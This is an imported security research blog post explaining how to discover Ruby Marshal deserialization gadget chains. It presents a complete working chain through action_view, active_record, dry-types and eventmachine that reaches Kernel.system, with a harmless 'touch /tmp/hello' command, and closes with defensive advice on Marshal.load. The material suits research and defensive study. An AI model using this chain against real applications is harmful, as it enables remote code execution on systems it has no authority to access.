---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-13_discovering-deserialization-gadget-chains-in-rubyland.md
original_filename: 2024-03-13_discovering-deserialization-gadget-chains-in-rubyland.md
title: Discovering Deserialization Gadget Chains in Rubyland
category: documents
detected_topics:
- command-injection
- sso
- otp
- automation-abuse
- mobile-security
- supply-chain
tags:
- imported
- documents
- command-injection
- sso
- otp
- automation-abuse
- mobile-security
- supply-chain
language: en
raw_sha256: 8a92062e689e921022e8e12d827de8a0fe95f86843a3ec6ab6bcbc1ddc1a5f0f
text_sha256: cf1bcb7049bc5d295ffc6c50eceafdf58e41509be3b0f2372f67c3bb6c8133db
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Discovering Deserialization Gadget Chains in Rubyland

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-13_discovering-deserialization-gadget-chains-in-rubyland.md
- Source Type: markdown
- Detected Topics: command-injection, sso, otp, automation-abuse, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `8a92062e689e921022e8e12d827de8a0fe95f86843a3ec6ab6bcbc1ddc1a5f0f`
- Text SHA256: `cf1bcb7049bc5d295ffc6c50eceafdf58e41509be3b0f2372f67c3bb6c8133db`


## Content

---
title: "Discovering Deserialization Gadget Chains in Rubyland"
page_title: "Discovering Deserialization Gadget Chains in Rubyland - Include Security Research Blog"
url: "https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/"
final_url: "https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/"
authors: ["Alex Leahu"]
bugs: ["Insecure deserialization"]
publication_date: "2024-03-13"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 382
---

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/03/rubyland-2-edited.png?fit=512%2C512&ssl=1)

# Discovering Deserialization Gadget Chains in Rubyland

March 13, 2024March 13, 2024 — Alex Leahu

At Include Security we spend a good amount of time extending public techniques and creating new ones. In particular, when we are testing Ruby applications for our clients, we come across scenarios where there are no publicly documented Ruby deserialization gadget chains and we need to create a new one from scratch. But, if you have ever looked at the source code of a Ruby deserialization gadget chain, I bet you’ve thought “what sorcery is this”? Without having gone down the rabbit hole yourself it’s not clear what is happening or why any of it works, but you’re glad that it does work because it was the missing piece of your proof of concept. The goal of this post is to explain what goes into creating a gadget chain. We will explain the process a bit and then walk through a gadget chain that we created from scratch.

The final gadget chain in this post utilizes the following libraries: `action_view`, `active_record`, `dry-types`, and `eventmachine`. If your application is using all of these libraries then you’re in luck since at the end of the post you will have another documented gadget chain in your toolbox, at least until there are breaking code changes.

## The Quest

A client of ours wanted to get a more concrete example of how deserialization usage in their application could be abused. The focus of this engagement was to create a full-fledged proof of concept from scratch.

The main constraints were:

  * All application code and libraries were fair game to use in the gadget chain.
  * We need to target two separate environments with Ruby versions `2.0.0` and `3.0.4` due to the usage of the application by the client in various environments.

The universal deserialization gadget from [vakzz](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) works for Ruby version `<= 3.0.2` so we already had a win for the first environment that was using Ruby version `2.0.0`. But we would need something new for the second environment. Universal gadget chains depend only on Gems that are loaded by default. These types of gadget chains are harder to find because there is less code to work with, but the advantage is that it can work in any environment. In this case, we don’t need to limit ourselves since we are making a gadget chain only for us.

## Lay of the Land

### Deserialization Basics

Before I continue, I would like to mention that these two blog posts are amazing resources and were a great source of inspiration for how to approach finding a new gadget chain. These blog posts give great primers on what makes a gadget chain work and then walk through the process of finding gadgets needed for a gadget chain. Both of these posts target universal gadget chains and even include some scripts to help you with the hunt.

  * <https://www.elttam.com/blog/ruby-deserialization/>
  * <https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html>

In addition, reading up on [Marshal](https://ruby-doc.org/3.3.0/Marshal.html) will help you understand serialization and deserialization in Ruby. In an effort to not repeat a lot of what has already been said quite well, this post will leave out some of the details expressed in these resources.

### Ruby Tidbits

Here are some quick Ruby tidbits that might not be obvious to non-Ruby experts, but are useful in understanding our gadget chain.

#### 1\. `Class#allocate`

Used to create a new instance of a class without calling the `initialize` function. Since we aren’t really using the objects the way they were intended we want to skip over using the defined constructor. You would use this instead of calling `new`. It may be possible to use the constructor in some cases, but it requires you to pass the correct arguments to create the object and this would just be making our lives harder for no benefit.
  
  
  a = String.allocate

#### 2\. `Object#instance_variable_set`

Used to set an instance variable.
  
  
  someObj.instance_variable_set('@name', 'abcd')

#### 3\. `@varname`

An instance variable.

#### 4\. `Object#send`

Invokes a method identified by a symbol.
  
  
  Kernel.send(:system, 'touch/tmp/hello')

#### 5\. `<<`

Operators, including `<<`, are just Ruby methods and can be used as part of our gadget chain as well.
  
  
  def <<(value)
  @another.call(value)
  end

## The Hunt

### Preparation

The setup is pretty straightforward. You want to set up an environment with the correct version of Ruby, either using `rvm` or a [docker image](https://hub.docker.com/_/ruby). Then you want to install all the Gems that your target application has. Now that everything is installed pull out `grep`, `ripgrep`, or even Visual Studio Code, if you are so inclined, and start searching in your directory of installed Gems. A quick way to find out what directory to start searching is by using the `gem which <gem>` command.
  
  
  gem which rails
  /usr/local/bundle/gems/railties-7.1.3/lib/rails.rb

So now we know that `/usr/local/bundle/gems/` is where we begin our search. What do we actually search for?

### Grep, Cry, Repeat

You are going to hit a lot of dead ends when creating a gadget chain, but you forget all about the pain once you finally get that `touch` command to write a file. Creating a gadget chain requires you to work on it from both ends, the initial kick off gadget and the code execution gadget. You make progress on both ends until eventually you meet halfway through a gadget that ties everything together. Overall the following things need to happen:

  1. Find an initial kick off gadget, which is the start of the chain. 
  * Find classes that implement the `marshal_load` instance method and that can be tied to other gadgets.
  2. Find a way to trigger `Kernel::system`, which is the end of the chain. 
  * You can also trigger any other function as well. It just depends on what you are trying to accomplish with your gadget chain.
  3. Find a way to store and pass a shell command. 
  * We do this with Gadget C later in the post.
  4. Tie a bunch of random function calls to get you from the start to the end.

The main approach to step 1 was to load a list of Gems into a script and then use this neat Ruby script from [Luke Jahnke](https://www.elttam.com/blog/ruby-deserialization/):
  
  
  ObjectSpace.each_object(::Class) do |obj|
  all_methods = obj.instance_methods + obj.protected_instance_methods + obj.private_instance_methods
  
  if all_methods.include? :marshal_load
  method_origin = obj.instance_method(:marshal_load).inspect[/\((.*)\)/,1] || obj.to_s
  
  puts obj
  puts "  marshal_load defined by #{method_origin}"
  puts "  ancestors = #{obj.ancestors}"
  puts
  end
  end

The main approach to steps 2-4 was to look for instance variables that have a method called on them In other words look for something like `@block.send()`. The reason being so that we can set the instance variable to another object and call that method on it.

Believe it or not, the workhorse for this process were the two following commands. The purpose of these commands was to find variations of `@variable.method(` as previously explained.
  
  
  grep --color=always -B10 -A10 -rE '@[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\(' --include \*.rb | less

Occasionally, I would narrow down the method using a modified `grep` when I wanted to look for a specific method to fit in the chain. In this case I was looking for `@variable.write(`.
  
  
  grep --color=always -B10 -A10 -rE '@[a-zA-Z0-9_]+\.write\(' --include \*.rb | less

There is a small chance that valid gadgets could consist of unicode characters or even operators so these regexes aren’t perfect, but in this case they were sufficient to discover the necessary gadgets.

It’s hard to have one consistent approach to finding a gadget chain, but this should give you a decent starting point.

## Completed Gadget Chain

Now let’s go through the final gadget chain that we came up with and try to make sense of it. The final chain utilized the following libraries: `action_view`, `active_record`, `dry-types`, and `eventmachine`.
  
  
  require 'action_view' # required by rails
  require 'active_record' # required by rails
  require 'dry-types' # required by grape
  require 'eventmachine' # required by faye
  
  COMMAND = 'touch /tmp/hello'
  
  # Gadget A
  a = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate
  a.instance_variable_set('@target', Kernel)
  a.instance_variable_set('@name', :system)
  
  # Gadget B
  b = ActionView::StreamingBuffer.allocate
  b.instance_variable_set('@block', a) # Reference to Gadget A
  
  # Gadget C
  c  = BufferedTokenizer.allocate
  c.instance_variable_set('@trim', -1)
  c.instance_variable_set('@input', b) # Reference to Gadget B
  c.instance_variable_set('@tail', COMMAND)
  
  # Gadget D
  d = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate
  d.instance_variable_set('@target', c) # Reference to Gadget C
  d.instance_variable_set('@name', :extract)
  
  # Gadget E
  e = ActionView::StreamingTemplateRenderer::Body.allocate
  e.instance_variable_set('@start', d) # Reference to Gadget D
  
  # Override marshal_dump method to avoid execution
  # when serializing.
  module ActiveRecord
  module Associations
  class Association
  def marshal_dump
  @data
  end
  end
  end
  end
  
  # Gadget F
  f = ActiveRecord::Associations::Association.allocate
  f.instance_variable_set('@data', ['', e]) # Reference to Gadget E
  
  # Serialize object to be used in another application through Marshal.load()
  payload = Marshal.dump(f) # Reference to Gadget F
  
  # Example deserialization of the serialized object created
  Marshal.load(payload)

The gadgets are labeled A -> F and defined in this order in the source code, but during serialization/deserialization the process occurs starting from F -> A. We pass Gadget F to the `Marshal.dump` function which kicks off the chain until we get to Gadget A.

### Visualization

The following diagram visualizes the flow of the gadget chain. This is a high-level recap of the gadget chain in the order it actually gets executed.

**Note:** The word `junk` is used as a placeholder any time a function is receiving an argument, but the actual argument does not matter to our gadget chain. We often don’t even control the argument in these cases.

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2024/03/image-3.png?resize=801%2C1024&ssl=1)

The next few sections will break down the gadget chain into smaller pieces and have annotations along with the library source code that explains what we are doing at each step.

### Code Walkthrough

#### Libraries

**Chain Source**
  
  
  require 'action_view' # required by rails
  require 'active_record' # required by rails
  require 'dry-types' # required by grape
  require 'eventmachine' # required by faye
  
  COMMAND = 'touch /tmp/hello'

  * Include all the necessary libraries for this gadget chain. The environment we tested used `rails`, `grape`, and `faye` which imported all of the necessary libraries.
  * `COMMAND` is the command that will get executed by the gadget chain when it is deserialized.

#### Gadget A

**Chain Source**
  
  
  a = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate
  a.instance_variable_set('@target', Kernel)
  a.instance_variable_set('@name', :system)

**Library Source**
  
  
  # https://github.com/dry-rb/dry-types/blob/cfa8330a3cd9461ed60e41ab6c5d5196f56091c4/lib/dry/types/constructor/function.rb#L85-L89
  class PrivateCall < MethodCall
  def call(input, &block)
  @target.send(@name, input, &block)
  end
  end

  * Allocate `PrivateCall` as `a`.
  * Set `@target` instance variable to `Kernel`.
  * Set `@name` instance variable to `:system`.

**Result** : When `a.call('touch /tmp/hello')` gets called from Gadget B, this gadget will then call `Kernel.send(:system, 'touch/tmp/hello', &block)`.

#### Gadget B

**Chain Source**
  
  
  b = ActionView::StreamingBuffer.allocate
  b.instance_variable_set('@block', a)

**Library Source**
  
  
  # https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/actionview/lib/action_view/buffers.rb#L108-L117
  class StreamingBuffer # :nodoc:
  def initialize(block)
  @block = block
  end
  
  def <<(value)
  value = value.to_s
  value = ERB::Util.h(value) unless value.html_safe?
  @block.call(value)
  end

  * Allocate `StreamingBuffer` as `b`.
  * Set `@block` instance variable to Gadget A, `a`.

**Result** : When `b << 'touch /tmp/hello'` gets called, this gadget will then call `a.call('touch /tmp/hello')`.

#### Gadget C

**Chain Source**
  
  
  c  = BufferedTokenizer.allocate
  c.instance_variable_set('@trim', -1)
  c.instance_variable_set('@input', b)
  c.instance_variable_set('@tail', COMMAND)

**Library Source**
  
  
  # https://github.com/eventmachine/eventmachine/blob/42374129ab73c799688e4f5483e9872e7f175bed/lib/em/buftok.rb#L6-L48
  class BufferedTokenizer
  
  ...omitted for brevity...
  
  def extract(data)
  if @trim > 0
  tail_end = @tail.slice!(-@trim, @trim) # returns nil if string is too short
  data = tail_end + data if tail_end
  end
  
  @input << @tail
  entities = data.split(@delimiter, -1)
  @tail = entities.shift
  
  unless entities.empty?
  @input << @tail
  entities.unshift @input.join
  @input.clear
  @tail = entities.pop
  end
  
  entities
  end

  * Allocate `BufferedTokenizer` as `c`.
  * Set `@trim` instance variable to `-1` to skip the first `if` statement.
  * Set `@input` instance variable to Gadget B, `b`.
  * Set `@tail` instance variable to the command that will eventually get passed to `Kernel::system`.

**Result** : When `c.extract(junk)` gets called, this gadget will then call `b << 'touch /tmp/hello'`.

#### Gadget D

**Chain Source**
  
  
  d = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate
  d.instance_variable_set('@target', c)
  d.instance_variable_set('@name', :extract)

**Library Source**
  
  
  # https://github.com/dry-rb/dry-types/blob/cfa8330a3cd9461ed60e41ab6c5d5196f56091c4/lib/dry/types/constructor/function.rb#L85-L89
  class PrivateCall < MethodCall
  def call(input, &block)
  @target.send(@name, input, &block)
  end
  end

  * Allocate `PrivateCall` as `d`.
  * Set `@target` instance variable to Gadget C, `c`.
  * Set `@name` instance variable to `:extract`, as the method that will be called on `c`.

**Result** : When `d.call(junk)` gets called, this gadget will then call `c.send(:extract, junk, @block)`.

#### Gadget E

**Chain Source**
  
  
  e = ActionView::StreamingTemplateRenderer::Body.allocate
  e.instance_variable_set('@start', d)

**Library Source**
  
  
  # https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/actionview/lib/action_view/renderer/streaming_template_renderer.rb#L14-L27
  class Body # :nodoc:
  def initialize(&start)
  @start = start
  end
  
  def each(&block)
  begin
  @start.call(block)
  rescue Exception => exception
  log_error(exception)
  block.call ActionView::Base.streaming_completion_on_exception
  end
  self
  end

  * Allocate `Body` as `e`.
  * Set `@start` instance variable to Gadget D, `d`.

**Result** : When `e.each(junk)` is called, this gadget will then call `d.call(junk)`.

#### Gadget F

**Chain Source**
  
  
  module ActiveRecord
  module Associations
  class Association
  def marshal_dump
  @data
  end
  end
  end
  end
  
  f = ActiveRecord::Associations::Association.allocate
  f.instance_variable_set('@data', ['', e])

**Library Source**
  
  
  # https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/activerecord/lib/active_record/associations/association.rb#L184-L193
  
  def marshal_dump
  ivars = (instance_variables - [:@reflection, :@through_reflection]).map { |name| [name, instance_variable_get(name)] }
  [@reflection.name, ivars]
  end
  
  def marshal_load(data)
  reflection_name, ivars = data
  ivars.each { |name, val| instance_variable_set(name, val) }
  @reflection = @owner.class._reflect_on_association(reflection_name)
  end

  * Override the `marshal_dump` method so that we only serialize `@data`.
  * Allocate `Association` as `f`.
  * Set `@data` instance variable to the array `['', e]` where `e` is Gadget E. The empty string at index 0 is not used for anything.

**Result** : When deserialization begins, this gadget will then call `e.each(junk)`.

#### Serialize and Deserialize
  
  
  payload = Marshal.dump(f)

  * Gadget F, `f` is passed to `Marshal.dump` and the entire gadget chain is serialized and stored in `payload`. The `marshal_load` function in Gadget F will be invoked upon deserialization.

If you want to execute the payload you just generated you can pass the `payload` back into `Marshal.load`. Since we already have all the libraries loaded in this script it will deserialize and execute the command you defined.
  
  
  Marshal.load(payload)

  * `payload` is passed to `Marshal.load` to deserialize the gadget chain and execute the command.

We have just gone through the entire gadget chain from end to start. I hope this walk through helped to demystify the process a bit and give you a bit of insight into the process that goes behind creating a deserialization gadget chain. I highly recommend going through the exercise of creating a gadget chain from scratch, but be warned that at times it feels very tedious and unrewarding, until all the pieces click together.

If you’re a Ruby developer, what can you take away from reading this? This blog post has been primarily focused on an exploitation technique that is inherent in Ruby, so there isn’t anything easy to do to prevent it. Your best bet is to focus on ensuring that the risks of deserialization are not present in your application. To do that, be very careful when using `Marshal.load(payload)` and ensure that no user controlled payloads find their way into the deserialization process. This also applies to any other parsing you may do in Ruby that uses `Marshal.load` behind the scenes. Some examples include: YAML, CSV, and Oj. Make sure to also read through the documentation for your libraries to see if there is any “safe” loading which may help to reduce the risk.

Credit for the title artwork goes to [Pau Riva](https://www.pixilart.com/pauriva).

### Share this:

  * [ Share on X (Opens in new window) X ](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/?share=facebook)
  * 

### Like this:

Like Loading…

Categories [Uncategorized](https://blog.includesecurity.com/category/uncategorized/) Tags [appsec](https://blog.includesecurity.com/tag/appsec/), [deserialization](https://blog.includesecurity.com/tag/deserialization/), [gadget chains](https://blog.includesecurity.com/tag/gadget-chains/), [hacking](https://blog.includesecurity.com/tag/hacking/), [offensive security](https://blog.includesecurity.com/tag/offensive-security/), [OWASP](https://blog.includesecurity.com/tag/owasp/), [remote code execution](https://blog.includesecurity.com/tag/remote-code-execution/), [ruby](https://blog.includesecurity.com/tag/ruby/), [ruby hacking](https://blog.includesecurity.com/tag/ruby-hacking/), [security research](https://blog.includesecurity.com/tag/security-research/), [webappsec](https://blog.includesecurity.com/tag/webappsec/) Post navigation

[Improving LLM Security Against Prompt Injection: AppSec Guidance For Pentesters and Developers – Part 2](https://blog.includesecurity.com/2024/02/improving-llm-security-against-prompt-injection-appsec-guidance-for-pentesters-and-developers-part-2/)

[Coverage Guided Fuzzing – Extending Instrumentation to Hunt Down Bugs Faster!](https://blog.includesecurity.com/2024/04/coverage-guided-fuzzing-extending-instrumentation/)
